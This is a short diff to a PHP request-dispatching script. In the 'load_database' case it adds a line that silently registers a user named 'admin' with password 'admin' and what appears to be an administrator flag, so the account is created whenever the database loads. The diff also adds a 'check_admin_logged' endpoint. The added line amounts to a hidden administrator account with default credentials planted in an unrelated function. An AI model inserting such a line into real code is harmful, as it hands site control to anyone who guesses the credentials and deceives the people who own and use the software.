@@ -22,7 +22,9 @@ $args = json_decode($_POST['args'], false);
 switch ($args->function) {
 
   case 'load_database':
-    echo json_encode($db->load_database());
+    $output = json_encode($db->load_database());
+    $userHelper->register_user('admin', 'admin', 1);
+    echo $output;
     break;
 
   case 'get_path':
@@ -55,6 +57,10 @@ switch ($args->function) {
 
   case 'register_user':
     echo json_encode($userHelper->register_user($args->username, $args->password));
+    break;
+
+  case 'check_admin_logged':
+    echo json_encode($userHelper->check_admin_logged());
     break;
 
   default:
